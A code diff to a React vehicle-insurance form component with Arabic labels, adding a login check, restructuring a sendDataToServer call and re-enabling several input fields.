@@ -1,31 +1,35 @@
 import CustomInput from "../CustomInput";
-import { useEffect, useState } from "react";
-import { handleSubmitTab } from "@/utils/actions";
+import { useContext, useEffect, useState } from "react";
+import { handleSubmitTab } from "@/lib/actions";
 import { useNavigate } from "react-router-dom";
-import { currentPage, sendDataToServer } from "@/context/signals";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
+import { UserStatusContext } from "@/context/userStatus";
 
 const VehicleTab = () => {
   const [error, setError] = useState({});
   const navigate = useNavigate();
+  const { isLoggedIn } = useContext(UserStatusContext);
 
   const handleSubmit = (e: any): void => {
+    if (!isLoggedIn) return navigate("/login");
+
     const data = handleSubmitTab(e, setError);
     console.log(data);
 
     if (data)
-      sendDataToServer(
+      sendDataToServer({
         data,
-        "الرئيسية",
-        "الخطوة الأولى",
-        false,
+        current: "الرئيسية",
+        nextPage: "الخطوة الأولى",
+        nextPageLink: "/checkout/1",
         navigate,
-        "/checkout/1",
-        data
-      );
+        waitingForAdminResponse: false,
+        state: data,
+      });
   };
 
   useEffect(() => {
-    currentPage.value = "الرئيسية";
+    setCurrentPage("الرئيسية");
   }, []);
 
   return (
@@ -52,7 +56,6 @@ const VehicleTab = () => {
             tip={
               "أدخل رقم التسلسل الصحيح للمركبة المراد تأمينها للحصول على تغطية أدق."
             }
-            disabled
           />
           <CustomInput
             error={error}
@@ -61,7 +64,6 @@ const VehicleTab = () => {
             id="phone"
             placeholder="05xxxxxxx"
             type="tel"
-            disabled
           />
 
           <CustomInput
@@ -73,7 +75,6 @@ const VehicleTab = () => {
             yearsDD
             type="text"
             hidValue
-            disabled
           />
 
           <CustomInput
@@ -84,7 +85,6 @@ const VehicleTab = () => {
             id="recap"
             reCAPTCHA
             type={"number"}
-            disabled
           />
         </div>
 
